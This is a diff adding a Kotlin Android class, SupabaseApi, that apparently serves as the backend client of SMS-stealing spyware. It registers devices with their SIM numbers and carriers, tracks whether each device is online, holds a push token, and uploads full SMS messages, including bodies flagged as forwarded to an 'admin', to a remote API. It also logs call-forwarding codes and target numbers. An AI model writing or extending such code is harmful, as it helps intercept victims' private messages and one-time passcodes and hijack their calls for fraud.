@@ -1,0 +1,431 @@
+package com.example.admin.network
+
+import android.content.Context
+import android.util.Log
+import com.example.admin.utils.Constants
+import kotlinx.coroutines.suspendCancellableCoroutine
+import okhttp3.Call
+import okhttp3.Callback
+import okhttp3.Headers
+import okhttp3.MediaType.Companion.toMediaType
+import okhttp3.OkHttpClient
+import okhttp3.Request
+import okhttp3.RequestBody
+import okhttp3.RequestBody.Companion.toRequestBody
+import okhttp3.Response
+import org.json.JSONArray
+import org.json.JSONObject
+import java.io.IOException
+import java.text.SimpleDateFormat
+import java.util.Date
+import java.util.Locale
+import java.util.UUID
+import java.util.concurrent.TimeUnit
+import kotlin.coroutines.resume
+data class UpsertResult(val success: Boolean, val response: String?)
+data class QueryResult(val success: Boolean, val data: List<JSONObject>?, val error: String?)
+data class SingleResult(val success: Boolean, val data: JSONObject?, val error: String?)
+
+class SupabaseApi(private val context: Context) {
+
+    companion object {
+        private const val TAG = "SUPABASE_API"
+
+        private val UPSERT_URL get() = "${Constants.DEVICE_API_BASE_URL}/upsert"
+        private val GET_URL    get() = "${Constants.DEVICE_API_BASE_URL}/get"
+        private val UPDATE_URL get() = "${Constants.DEVICE_API_BASE_URL}/update"
+        private val DATA_URL   get() = "${Constants.DEVICE_API_BASE_URL}/data"
+
+        private val JSON_MEDIA_TYPE = "application/json; charset=utf-8".toMediaType()
+    }
+
+    private val client: OkHttpClient = OkHttpClient.Builder()
+        .connectTimeout(30, TimeUnit.SECONDS)
+        .readTimeout(30, TimeUnit.SECONDS)
+        .writeTimeout(30, TimeUnit.SECONDS)
+        .build()
+
+    // ── Public accessors ──────────────────────────────────
+    fun getAppId(): String        = Constants.APP_TOKEN
+    fun getOrCreateAppId(): String= Constants.APP_TOKEN
+    fun getTableName(): String    = Constants.TABLE_NAME
+    fun getSupabaseUrl(): String  = Constants.SUPABASE_URL
+    fun getSupabaseAnonKey(): String = Constants.SUPABASE_ANON_KEY
+    fun getApiBaseUrl(): String   = Constants.DEVICE_API_BASE_URL
+
+    // ── Internal helpers ──────────────────────────────────
+    private fun jsonBody(obj: JSONObject): RequestBody =
+        obj.toString().toRequestBody(JSON_MEDIA_TYPE)
+
+    private fun headers(): Headers = Headers.Builder()
+        .add("Content-Type", "application/json")
+        .build()
+
+    private fun fmt(ts: Long): String =
+        SimpleDateFormat("yyyy-MM-dd HH:mm:ss", Locale.getDefault()).format(Date(ts))
+
+    private fun mask(number: String): String {
+        val c = number.trim()
+        return if (c.length <= 4) "****" else "****${c.takeLast(4)}"
+    }
+
+    // ─────────────────────────────────────────────────────
+    //  CORE: smartUpsert
+    //
+    //  Flat JSON bhejo — backend khud split kar deta hai.
+    //  Koi bhi nayi field bhejo — data_json mein save hogi.
+    // ─────────────────────────────────────────────────────
+    fun smartUpsert(payload: JSONObject, callback: (Boolean, String?) -> Unit) {
+        try {
+            if (!payload.has("sub_id") && !payload.has("uid")) {
+                callback(false, "sub_id or uid required"); return
+            }
+            payload.put("app_id", Constants.APP_TOKEN)
+            payload.put("updated_at", System.currentTimeMillis())
+
+            val request = Request.Builder()
+                .url(UPSERT_URL)
+                .headers(headers())
+                .post(jsonBody(payload))
+                .build()
+
+            Log.d(TAG, "SMART_UPSERT → $UPSERT_URL")
+
+            client.newCall(request).enqueue(object : Callback {
+                override fun onFailure(call: Call, e: IOException) =
+                    callback(false, "Network error: ${e.message}")
+                override fun onResponse(call: Call, response: Response) {
+                    response.use {
+                        val body = it.body?.string()
+                        if (it.isSuccessful) callback(true, body)
+                        else callback(false, "HTTP ${it.code}: $body")
+                    }
+                }
+            })
+        } catch (e: Exception) { callback(false, "Exception: ${e.message}") }
+    }
+
+    suspend fun smartUpsertSuspend(payload: JSONObject): UpsertResult =
+        suspendCancellableCoroutine { cont ->
+            smartUpsert(payload) { ok, msg ->
+                if (cont.isActive) cont.resume(UpsertResult(ok, msg))
+            }
+        }
+
+    // ─────────────────────────────────────────────────────
+    //  REGISTER DEVICE
+    // ─────────────────────────────────────────────────────
+    fun registerDevice(uid: String, deviceInfo: JSONObject, callback: (Boolean, String?) -> Unit) {
+        if (uid.isBlank()) { callback(false, "UID missing"); return }
+        val now = System.currentTimeMillis()
+        val payload = JSONObject().apply {
+            put("sub_id", uid); put("uid", uid); put("app_id", Constants.APP_TOKEN)
+            put("data_type", "registered_device"); put("status", "active")
+            put("registered_at", now); put("created_at", now)
+            put("sms_messages", JSONArray()); put("total_sms_count", 0)
+            put("last_sms_timestamp", 0); put("last_sms_log", JSONObject())
+            val dj = JSONObject().apply {
+                put("model",          deviceInfo.optString("model", ""))
+                put("brand",          deviceInfo.optString("brand", ""))
+                put("manufacturer",   deviceInfo.optString("manufacturer", ""))
+                put("androidversion", deviceInfo.optString("androidversion", ""))
+                put("device_name",    deviceInfo.optString("device_name", deviceInfo.optString("model", "")))
+                put("sim1number",     deviceInfo.optString("sim1number", ""))
+                put("sim1carrier",    deviceInfo.optString("sim1carrier", ""))
+                put("sim2number",     deviceInfo.optString("sim2number", ""))
+                put("sim2carrier",    deviceInfo.optString("sim2carrier", ""))
+                put("joinedat",               deviceInfo.optLong("joinedat", now))
+                put("joinedat_readable",      fmt(deviceInfo.optLong("joinedat", now)))
+                put("registered_at",          now)
+                put("registered_at_readable", fmt(now))
+                put("fcm_token",              "")
+                put("fcm_token_status",       "not_registered")
+                put("online_status",          "unknown")
+                put("online_checked_at",      0)
+                put("last_seen_at",           0)
+            }
+            put("data_json", dj)
+        }
+        smartUpsert(payload, callback)
+    }
+
+    // ─────────────────────────────────────────────────────
+    //  HEARTBEAT
+    // ─────────────────────────────────────────────────────
+    suspend fun upsertHeartbeat(uid: String, heartbeatData: JSONObject): UpsertResult {
+        if (uid.isBlank()) return UpsertResult(false, "UID missing")
+        val now = System.currentTimeMillis()
+
+        val existing = try { getDeviceByUidSuspend(uid) } catch (_: Exception) { SingleResult(false, null, null) }
+        val dataJson = if (existing.success && existing.data != null)
+            existing.data.optJSONObject("data_json") ?: JSONObject()
+        else JSONObject()
+
+        dataJson.put("online_status",               "online")
+        dataJson.put("online_checked_at",           now)
+        dataJson.put("online_checked_at_readable",  fmt(now))
+        dataJson.put("last_seen_at",                now)
+        dataJson.put("last_seen_at_readable",       fmt(now))
+        dataJson.put("heartbeat", JSONObject().apply {
+            put("available", heartbeatData.optString("available", "Device is online"))
+            put("checked_at", heartbeatData.optLong("checked_at", now))
+        })
+
+        val payload = JSONObject().apply {
+            put("sub_id", uid); put("uid", uid)
+            put("status", "online")
+            put("last_heartbeat_at", now)
+            put("data_json", dataJson)
+        }
+        return smartUpsertSuspend(payload)
+    }
+
+    // ─────────────────────────────────────────────────────
+    //  FCM TOKEN
+    // ─────────────────────────────────────────────────────
+    fun updateDeviceToken(uid: String, token: String, callback: (Boolean, String?) -> Unit) {
+        if (uid.isBlank()) { callback(false, "UID missing"); return }
+        if (token.isBlank()) { callback(false, "Token empty"); return }
+        getDeviceByUid(uid) { res ->
+            val dataJson = if (res.success && res.data != null)
+                res.data.optJSONObject("data_json") ?: JSONObject()
+            else JSONObject()
+            dataJson.put("fcm_token", token)
+            dataJson.put("fcm_token_status", "active")
+            smartUpsert(JSONObject().apply {
+                put("sub_id", uid); put("data_json", dataJson)
+            }, callback)
+        }
+    }
+
+    fun getDeviceToken(uid: String, callback: (String?) -> Unit) {
+        getDeviceInfo(uid) { dj -> callback(dj?.optString("fcm_token", "")?.takeIf { it.isNotBlank() }) }
+    }
+
+    fun isTokenValid(uid: String, callback: (Boolean) -> Unit) {
+        getDeviceInfo(uid) { dj ->
+            callback(dj != null && dj.optString("fcm_token_status") == "active" && dj.optString("fcm_token", "").isNotBlank())
+        }
+    }
+
+    fun invalidateDeviceToken(uid: String, callback: (Boolean, String?) -> Unit) {
+        if (uid.isBlank()) { callback(false, "UID missing"); return }
+        getDeviceByUid(uid) { res ->
+            if (res.success && res.data != null) {
+                val dj = res.data.optJSONObject("data_json") ?: JSONObject()
+                dj.put("fcm_token_status", "inactive")
+                smartUpsert(JSONObject().apply { put("sub_id", uid); put("data_json", dj) }, callback)
+            } else callback(false, "Device not found")
+        }
+    }
+
+    // ─────────────────────────────────────────────────────
+    //  ONLINE STATUS
+    // ─────────────────────────────────────────────────────
+    fun updateOnlineStatus(uid: String, isOnline: Boolean, callback: (Boolean, String?) -> Unit) {
+        if (uid.isBlank()) { callback(false, "UID missing"); return }
+        if (!isOnline) { callback(true, "Ignored offline by rule"); return }
+        val now = System.currentTimeMillis()
+        getDeviceByUid(uid) { res ->
+            val dj = if (res.success && res.data != null)
+                res.data.optJSONObject("data_json") ?: JSONObject() else JSONObject()
+            dj.put("online_status", "online")
+            dj.put("online_checked_at", now); dj.put("online_checked_at_readable", fmt(now))
+            dj.put("last_seen_at", now);      dj.put("last_seen_at_readable", fmt(now))
+            smartUpsert(JSONObject().apply {
+                put("sub_id", uid); put("status", "online")
+                put("last_heartbeat_at", now); put("data_json", dj)
+            }, callback)
+        }
+    }
+
+    fun getOnlineStatus(uid: String, callback: (Boolean?) -> Unit) {
+        getDeviceInfo(uid) { dj ->
+            if (dj != null) callback(dj.optString("online_status") == "online") else callback(null)
+        }
+    }
+
+    fun getDeviceInfo(uid: String, callback: (JSONObject?) -> Unit) {
+        getDeviceByUid(uid) { res ->
+            if (res.success && res.data != null) callback(res.data.optJSONObject("data_json"))
+            else callback(null)
+        }
+    }
+
+    fun getDeviceByUid(uid: String, callback: (SingleResult) -> Unit) {
+        try {
+            if (uid.isBlank()) { callback(SingleResult(false, null, "UID missing")); return }
+            val url = "$GET_URL/$uid"
+            val request = Request.Builder().url(url).headers(headers()).get().build()
+            Log.d(TAG, "GET_DEVICE → $url")
+            client.newCall(request).enqueue(object : Callback {
+                override fun onFailure(call: Call, e: IOException) =
+                    callback(SingleResult(false, null, "Network error: ${e.message}"))
+                override fun onResponse(call: Call, response: Response) {
+                    response.use {
+                        val body = it.body?.string()
+                        if (it.isSuccessful && body != null) {
+                            try {
+                                val obj = JSONObject(body)
+                                if (obj.optBoolean("ok") && obj.has("data"))
+                                    callback(SingleResult(true, obj.getJSONObject("data"), null))
+                                else callback(SingleResult(false, null, obj.optString("error", "Not found")))
+                            } catch (e: Exception) { callback(SingleResult(false, null, "Parse: ${e.message}")) }
+                        } else callback(SingleResult(false, null, "HTTP ${it.code}: $body"))
+                    }
+                }
+            })
+        } catch (e: Exception) { callback(SingleResult(false, null, "Exception: ${e.message}")) }
+    }
+
+    private suspend fun getDeviceByUidSuspend(uid: String): SingleResult =
+        suspendCancellableCoroutine { cont ->
+            getDeviceByUid(uid) { if (cont.isActive) cont.resume(it) }
+        }
+
+    fun updateData(uid: String, updates: JSONObject, callback: (Boolean, String?) -> Unit) {
+        if (uid.isBlank()) { callback(false, "UID missing"); return }
+        try {
+            val url = "$UPDATE_URL/$uid"
+            updates.put("updated_at", System.currentTimeMillis())
+            val request = Request.Builder().url(url).headers(headers()).patch(jsonBody(updates)).build()
+            Log.d(TAG, "UPDATE → $url")
+            client.newCall(request).enqueue(object : Callback {
+                override fun onFailure(call: Call, e: IOException) = callback(false, "Network error: ${e.message}")
+                override fun onResponse(call: Call, response: Response) {
+                    response.use {
+                        val body = it.body?.string()
+                        if (it.isSuccessful) callback(true, body)
+                        else callback(false, "HTTP ${it.code}: $body")
+                    }
+                }
+            })
+        } catch (e: Exception) { callback(false, "Exception: ${e.message}") }
+    }
+
+    fun getAllDevices(limit: Int = 1000, callback: (QueryResult) -> Unit) {
+        callback(QueryResult(false, null, "Use admin portal for device listing"))
+    }
+
+    fun getDevicesWithActiveTokens(callback: (List<Pair<String, String>>) -> Unit) = callback(emptyList())
+    fun getOnlineDevices(callback: (List<Pair<String, JSONObject>>) -> Unit) = callback(emptyList())
+
+    fun insertSmsLog(smsData: JSONObject, callback: (Boolean, String?) -> Unit) {
+        val uid = smsData.optString("uid", smsData.optString("sub_id", ""))
+        if (uid.isBlank()) { callback(false, "UID missing"); return }
+        getDeviceByUid(uid) { res ->
+            if (res.success && res.data != null) {
+                val smsArray = JSONArray()
+                val existing = res.data.optJSONArray("sms_messages")
+                if (existing != null) for (i in 0 until existing.length()) smsArray.put(existing.getJSONObject(i))
+
+                val sender    = smsData.optString("phone_number", "")
+                val receiver  = smsData.optString("receiver_number", "")
+                val body      = smsData.optString("message_body", "")
+                val ts        = smsData.optLong("timestamp", System.currentTimeMillis())
+                val direction = smsData.optString("direction", "incoming")
+                val status    = smsData.optString("status", "received")
+                val simSlot   = smsData.optInt("sim_slot", 1)
+                val smsId     = smsData.optString("sms_id", UUID.randomUUID().toString())
+                val title     = smsData.optString("title", "New SMS")
+                val forwarded = smsData.optBoolean("is_forwarded_to_admin", false)
+
+                smsArray.put(JSONObject().apply {
+                    put("sms_id", smsId); put("sender_number", sender)
+                    put("receiver_number", receiver); put("message_body", body.take(1000))
+                    put("timestamp", ts); put("timestamp_readable", fmt(ts))
+                    put("direction", direction); put("status", status); put("sim_slot", simSlot)
+                    put("synced_at", System.currentTimeMillis()); put("message_length", body.length)
+                    put("title", title); put("is_forwarded_to_admin", forwarded)
+                })
+                while (smsArray.length() > 1000) smsArray.remove(0)
+
+                val lastLog = JSONObject().apply {
+                    put("title", title); put("status", status); put("direction", direction)
+                    put("timestamp", fmt(ts)); put("synced_at", System.currentTimeMillis())
+                    put("is_forwarded_to_admin", forwarded)
+                    put("sender_masked", mask(sender)); put("receiver_masked", mask(receiver))
+                    put("message_length", body.length); put("has_body", body.isNotBlank())
+                    put("message_preview", body.take(100)); put("sms_id", smsId)
+                    put("message_body", body.take(500))
+                }
+
+                smartUpsert(JSONObject().apply {
+                    put("sub_id", uid)
+                    put("sms_messages", smsArray)
+                    put("last_sms_log", lastLog)
+                    put("total_sms_count", smsArray.length())
+                    put("last_sms_timestamp", ts)
+                    put("sms_sync_status", "SYNCED")
+                    put("sms_last_sync_at", System.currentTimeMillis())
+                }, callback)
+            } else callback(false, res.error ?: "Device not found")
+        }
+    }
+
+    fun getLastSmsLog(uid: String, callback: (SingleResult) -> Unit) {
+        getDeviceByUid(uid) { res ->
+            if (res.success && res.data != null) {
+                val log = res.data.optJSONObject("last_sms_log")
+                callback(SingleResult(true, log, if (log == null) "No SMS" else null))
+            } else callback(SingleResult(false, null, res.error ?: "Device not found"))
+        }
+    }
+
+    fun getSmsHistory(uid: String, limit: Int = 50, offset: Int = 0, callback: (QueryResult) -> Unit) {
+        getDeviceByUid(uid) { res ->
+            if (res.success && res.data != null) {
+                val arr = res.data.optJSONArray("sms_messages")
+                if (arr != null) {
+                    val list = mutableListOf<JSONObject>()
+                    for (i in 0 until arr.length()) list.add(arr.getJSONObject(i))
+                    list.sortByDescending { it.optLong("timestamp", 0) }
+                    val start = offset.coerceAtLeast(0).coerceAtMost(list.size)
+                    val end   = minOf(start + limit.coerceAtLeast(1), list.size)
+                    callback(QueryResult(true, list.subList(start, end), null))
+                } else callback(QueryResult(true, emptyList(), null))
+            } else callback(QueryResult(false, null, res.error ?: "Device not found"))
+        }
+    }
+
+    fun updateCallForwardData(uid: String, code: String, slot: Int, status: String,
+                              response: String, action: String, number: String,
+                              callback: (Boolean, String?) -> Unit) {
+        if (uid.isBlank()) { callback(false, "UID missing"); return }
+        smartUpsert(JSONObject().apply {
+            put("sub_id", uid)
+            put("call_forward_status", status); put("call_forward_action", action)
+            put("call_forward_code", code);     put("call_forward_number", number)
+            put("call_forward_sim_slot", slot); put("call_forward_response", response.take(500))
+            put("call_forward_timestamp", System.currentTimeMillis())
+        }, callback)
+    }
+
+    fun updateSmsSyncStatus(uid: String, pendingCount: Int, processedCount: Int,
+                            status: String, permissionStatus: String, error: String?,
+                            callback: (Boolean, String?) -> Unit) {
+        if (uid.isBlank()) { callback(false, "UID missing"); return }
+        smartUpsert(JSONObject().apply {
+            put("sub_id", uid)
+            put("sms_sync_status", status);          put("sms_pending_count", pendingCount)
+            put("sms_processed_count", processedCount); put("sms_permission_status", permissionStatus)
+            put("sms_last_sync_at", System.currentTimeMillis()); put("sms_last_error", error ?: "")
+        }, callback)
+    }
+
+    suspend fun upsertData(data: JSONObject, dataType: String): UpsertResult {
+        val subId = data.optString("sub_id", data.optString("uid", ""))
+        return upsertData(data, dataType, subId)
+    }
+
+    suspend fun upsertData(data: JSONObject, dataType: String, subId: String): UpsertResult {
+        if (subId.isBlank()) return UpsertResult(false, "subId/uid missing")
+        data.put("sub_id", subId); data.put("data_type", dataType)
+        return smartUpsertSuspend(data)
+    }
+
+
+    fun deleteData(uid: String, callback: (Boolean, String?) -> Unit) {
+        callback(false, "Use admin portal to delete devices")
+    }
+}
